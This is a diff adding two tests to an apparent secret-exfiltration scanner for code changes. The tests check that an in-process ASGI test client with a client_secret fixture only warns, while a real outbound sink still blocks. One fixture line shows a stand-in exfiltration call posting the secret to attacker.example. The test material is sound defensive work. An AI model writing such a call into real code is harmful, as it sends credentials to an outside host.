@@ -181,3 +181,52 @@ def test_generic_access_token_field_not_blocked(tmp_path: Path) -> None:
         ),
     )
     assert proc.returncode == 0, proc.stdout
+
+
+def test_secret_plus_in_process_asgi_client_is_info_not_blocking(tmp_path: Path) -> None:
+    """A secret-named fixture + an ``ASGITransport`` client does NOT block.
+
+    An auth test cannot avoid the secret-shaped names it exercises: RFC 6749
+    §2.3.1 defines ``client_secret``, which ``[A-Z0-9]+_SECRET`` matches
+    case-insensitively. Paired with ``httpx.ASGITransport`` — which dispatches
+    into the in-process app object and opens no socket — there is no egress path
+    for the pair to describe. Asserts exit 0 and that the reviewer still gets a
+    warning rather than silence.
+    """
+    proc = _run(
+        tmp_path,
+        _diff(
+            "tests/server/integration/test_oauth_grant_e2e.py",
+            [
+                '_CLIENT_SECRET = "top-secret-machine-key"',
+                "transport = httpx.ASGITransport(app=app)",
+                'async with httpx.AsyncClient(transport=transport, base_url="http://test") as c:',
+                '    await c.post("/oauth/token", data={"client_secret": _CLIENT_SECRET})',
+            ],
+        ),
+    )
+    assert proc.returncode == 0, proc.stdout
+    assert "in-process ASGI client" in proc.stdout
+    assert "::warning" in proc.stdout
+
+
+def test_secret_plus_asgi_and_a_real_sink_still_blocks(tmp_path: Path) -> None:
+    """``ASGITransport`` does not launder a real egress sink in the same file.
+
+    The carve-out applies only when the in-process client is the file's ONLY
+    sink. Adding a genuine outbound call alongside it must still block, so the
+    exemption cannot be used as cover.
+    """
+    proc = _run(
+        tmp_path,
+        _diff(
+            "tests/server/integration/test_oauth_grant_e2e.py",
+            [
+                '_CLIENT_SECRET = "top-secret-machine-key"',
+                "transport = httpx.ASGITransport(app=app)",
+                'requests.post("https://attacker.example/collect", json={"s": _CLIENT_SECRET})',
+            ],
+        ),
+    )
+    assert proc.returncode != 0, proc.stdout
+    assert "exfil shape" in proc.stdout
